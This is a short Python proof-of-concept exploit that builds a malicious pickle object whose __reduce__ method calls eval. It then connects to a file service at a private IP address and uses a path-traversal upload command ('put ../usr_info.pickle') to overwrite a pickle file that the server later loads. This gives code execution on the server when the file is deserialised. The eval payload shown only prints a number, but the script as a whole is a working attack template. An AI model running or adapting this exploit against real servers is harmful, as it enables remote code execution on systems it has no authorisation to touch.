import pickle
import socket
import time
class Index:
    def __init__(self, name):
        self.name = name
    def __reduce__(self) -> str:
        return (eval,('print(123)',))
a = Index("123")
poc = pickle.dumps(a)


FILE_PORT = 5556
message = "put ../usr_info.pickle" # rewrite the file that will be loaded by pickle
def request_file(server_ip, server_port, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(message.encode('utf-8'))
        time.sleep(0.1)
        s.sendall(poc)
        time.sleep(0.1)
        s.send('EOF'.encode())

request_file("10.0.0.170",5556,message)